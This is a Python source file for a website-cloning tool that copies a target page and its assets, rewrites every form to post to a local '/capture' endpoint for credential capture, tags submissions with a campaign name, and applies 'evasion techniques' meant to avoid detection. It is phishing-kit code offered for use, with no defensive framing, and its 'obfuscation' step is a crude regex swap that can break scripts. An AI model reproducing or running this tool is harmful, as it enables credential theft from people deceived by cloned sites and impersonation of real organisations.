import os
import requests
from bs4 import BeautifulSoup
import logging
from urllib.parse import urlparse, urljoin
import re
import mimetypes
from pathlib import Path
from typing import Optional, Dict
import hashlib
import random
import string

class WebCloner:
    def __init__(self):
        self.logger = logging.getLogger(__name__)
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
            'Accept-Language': 'en-US,en;q=0.9'
        })
        self.evasion_techniques = {
            'obfuscate_js': True,
            'randomize_ids': True,
            'modify_fingerprint': True
        }
        self.asset_map = {}

    def clone_site(self, url: str, output_dir: str, campaign_name: Optional[str] = None, 
                  evasion_config: Optional[Dict] = None) -> bool:
        """Advanced website cloning with form modification and evasion techniques"""
        try:
            # Apply evasion config if provided
            if evasion_config:
                self.evasion_techniques.update(evasion_config)

            # Validate and parse URL
            parsed = urlparse(url)
            if not parsed.scheme:
                url = 'https://' + url
                parsed = urlparse(url)

            # Create output directory structure
            output_path = Path(output_dir)
            output_path.mkdir(parents=True, exist_ok=True)
            assets_dir = output_path / 'assets'
            assets_dir.mkdir(exist_ok=True)

            # Fetch target page
            response = self.session.get(url)
            response.raise_for_status()
            base_url = f"{parsed.scheme}://{parsed.netloc}"

            # Parse HTML
            soup = BeautifulSoup(response.text, 'html.parser')

            # Process all assets (CSS, JS, images)
            self._clone_assets(soup, base_url, assets_dir)

            # Modify all forms
            for form in soup.find_all('form'):
                self._modify_form(form, soup, campaign_name)

            # Apply evasion techniques
            if self.evasion_techniques['obfuscate_js']:
                self._obfuscate_javascript(soup)
            if self.evasion_techniques['randomize_ids']:
                self._randomize_element_ids(soup)

            # Save cloned page
            index_path = output_path / 'index.html'
            with open(index_path, 'w', encoding='utf-8') as f:
                f.write(str(soup))

            self.logger.info(f"Successfully cloned {url} with advanced features")
            return True

        except Exception as e:
            self.logger.error(f"Advanced web cloning failed: {str(e)}", exc_info=True)
            return False

    def _clone_assets(self, soup: BeautifulSoup, base_url: str, assets_dir: Path):
        """Clone all page assets (CSS, JS, images)"""
        # Process CSS files
        for link in soup.find_all('link', {'rel': 'stylesheet'}):
            if link.get('href'):
                asset_url = urljoin(base_url, link['href'])
                local_path = self._download_asset(asset_url, assets_dir, 'css')
                if local_path:
                    link['href'] = f"assets/{local_path.name}"

        # Process JavaScript files
        for script in soup.find_all('script'):
            if script.get('src'):
                asset_url = urljoin(base_url, script['src'])
                local_path = self._download_asset(asset_url, assets_dir, 'js')
                if local_path:
                    script['src'] = f"assets/{local_path.name}"

        # Process images
        for img in soup.find_all('img'):
            if img.get('src'):
                asset_url = urljoin(base_url, img['src'])
                local_path = self._download_asset(asset_url, assets_dir, 'images')
                if local_path:
                    img['src'] = f"assets/{local_path.name}"

    def _download_asset(self, url: str, assets_dir: Path, asset_type: str) -> Optional[Path]:
        """Download and save an asset file"""
        try:
            response = self.session.get(url, stream=True)
            response.raise_for_status()

            # Generate unique filename
            ext = mimetypes.guess_extension(response.headers.get('content-type', '')) or '.bin'
            filename = f"{hashlib.md5(url.encode()).hexdigest()}{ext}"
            filepath = assets_dir / filename

            # Save file
            with open(filepath, 'wb') as f:
                for chunk in response.iter_content(1024):
                    f.write(chunk)

            return filepath

        except Exception as e:
            self.logger.warning(f"Failed to download asset {url}: {str(e)}")
            return None

    def _modify_form(self, form, soup, campaign_name):
        """Modify form for credential capture"""
        original_action = form.get('action', '')
        form['action'] = "/capture"
        form['method'] = "POST"
        
        # Add hidden campaign tracking field
        if campaign_name:
            hidden = soup.new_tag('input')
            hidden['type'] = 'hidden'
            hidden['name'] = 'campaign'
            hidden['value'] = campaign_name
            form.append(hidden)

        # Add honeypot field
        honeypot = soup.new_tag('input')
        honeypot['type'] = 'text'
        honeypot['name'] = 'honeypot'
        honeypot['style'] = 'display:none'
        form.append(honeypot)

    def _obfuscate_javascript(self, soup):
        """Obfuscate JavaScript code to evade detection"""
        for script in soup.find_all('script'):
            if script.string:
                # Simple obfuscation - replace with more complex in production
                script.string = re.sub(r'\bvar\b', 'const', script.string)
                script.string = re.sub(r'\blet\b', 'const', script.string)

    def _randomize_element_ids(self, soup):
        """Randomize element IDs to break fingerprinting"""
        for element in soup.find_all(id=True):
            element['id'] = ''.join(random.choices(string.ascii_lowercase + string.digits, k=12))
